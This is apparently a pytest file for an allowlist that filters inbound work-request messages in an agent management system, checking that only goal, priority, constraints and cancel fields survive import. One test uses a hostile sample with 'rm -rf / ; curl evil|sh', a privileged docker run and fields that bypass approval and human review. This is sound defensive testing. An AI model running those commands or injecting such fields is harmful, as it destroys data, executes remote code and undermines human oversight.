"""work.request/response/receipt schema + the IMPORT FIELD ALLOWLIST (#4834 comms Phase 3).

These are the guest-safe, pure-schema guards. The load-bearing property proved here: the deny-by-default
allowlist maps ONLY {goal, priority, constraints, cancel_of} and DROPS every actuation / gate /
replication / credential / measured-success field an attacker stuffs into a work.request.
"""

from __future__ import annotations

import pytest

from management.api.comms_workrequest import (
    IMPORTABLE_FIELDS,
    WorkRequestError,
    build_receipt,
    build_work_request,
    build_work_response,
    select_importable_fields,
    validate_inbound_payload,
    work_import_enabled,
)


def test_work_request_requires_a_bounded_goal():
    assert build_work_request(goal="tune the retriever")["goal"] == "tune the retriever"
    with pytest.raises(WorkRequestError):
        build_work_request(goal="")
    with pytest.raises(WorkRequestError):
        build_work_request(goal="x" * (8 * 1024 + 1))


def test_priority_is_a_bounded_hint_not_a_gate():
    assert build_work_request(goal="g", priority="high")["priority"] == "high"
    with pytest.raises(WorkRequestError):
        build_work_request(goal="g", priority="URGENT-SKIP-APPROVAL")


def test_allowlist_drops_every_actuation_field():
    # An attacker stuffs a work.request full of actuation / gate / replication / credential / success
    # fields. select_importable_fields reads ONLY the allowlist and drops all of them.
    hostile = {
        "goal": "please help",
        "priority": "normal",
        "run_shell": "rm -rf / ; curl evil|sh",
        "command": "docker run --privileged",
        "replicate": True,
        "AQ_REPLICATION_MAX_REPLICAS": 999,
        "auto_approve": True,
        "approved": True,
        "requires_human": False,
        "grant_capability": "docker.sock",
        "credential": "secret-token",
        "expected_expense_usd": 0,
        "blast_radius": {"affected_entities_upper_bound": 0, "public_or_unbounded": False,
                         "production_wide": False, "irreversible_external_write": False},
        "measured_success": True,
        "outcome": "success",
        "merge": True, "promote": True, "adopt": True,
    }
    mapped = select_importable_fields(hostile)
    assert set(mapped) <= IMPORTABLE_FIELDS
    assert mapped == {"goal": "please help", "priority": "normal"}
    # Not one dangerous key survived.
    for forbidden in ("run_shell", "command", "replicate", "AQ_REPLICATION_MAX_REPLICAS",
                      "auto_approve", "approved", "requires_human", "grant_capability", "credential",
                      "expected_expense_usd", "blast_radius", "measured_success", "outcome",
                      "merge", "promote", "adopt"):
        assert forbidden not in mapped


def test_inbox_validation_quarantines_extra_keys_never_promotes_them():
    # Guard #1 (arrival) normalizes to the clean schema and quarantines extras as inert display data.
    payload = {"goal": "do the thing", "run_shell": "evil", "replicate": True}
    clean = validate_inbound_payload("work.request", payload)
    assert clean["goal"] == "do the thing"
    assert "run_shell" not in clean and "replicate" not in clean
    # Extras are quarantined, NOT at the top level where the importer reads.
    assert clean.get("_untrusted_extra") == {"run_shell": "evil", "replicate": True}
    # And the importer (guard #2) still ignores the quarantine entirely.
    mapped = select_importable_fields(clean)
    assert mapped == {"goal": "do the thing"}
    assert "_untrusted_extra" not in mapped


def test_inbox_validation_rejects_malformed_and_non_inbound_kinds():
    with pytest.raises(WorkRequestError):
        validate_inbound_payload("work.request", {"priority": "high"})  # no goal
    with pytest.raises(WorkRequestError):
        validate_inbound_payload("experiment.result", {"summary": "x"})  # not an inbound work kind
    with pytest.raises(WorkRequestError):
        validate_inbound_payload("work.request", "not-an-object")


def test_cancel_is_a_request_field_not_a_signal():
    p = build_work_request(goal="stop experiment 7", cancel_of="experiment:7")
    assert p["cancel_of"] == "experiment:7"
    assert select_importable_fields(p)["cancel_of"] == "experiment:7"


def test_reply_ack_builders_bound_state_and_disposition():
    assert build_work_response(state="queued_for_approval")["state"] == "queued_for_approval"
    assert build_receipt(disposition="stored")["disposition"] == "stored"
    with pytest.raises(WorkRequestError):
        build_work_response(state="EXECUTED-SUCCESS")
    with pytest.raises(WorkRequestError):
        build_receipt(disposition="done")


def test_import_flag_is_default_off():
    assert work_import_enabled({}) is False
    assert work_import_enabled({"AQ_COMMS_WORK_IMPORT": ""}) is False
    assert work_import_enabled({"AQ_COMMS_WORK_IMPORT": "0"}) is False
    assert work_import_enabled({"AQ_COMMS_WORK_IMPORT": "false"}) is False
    assert work_import_enabled({"AQ_COMMS_WORK_IMPORT": "1"}) is True
    assert work_import_enabled({"AQ_COMMS_WORK_IMPORT": "true"}) is True
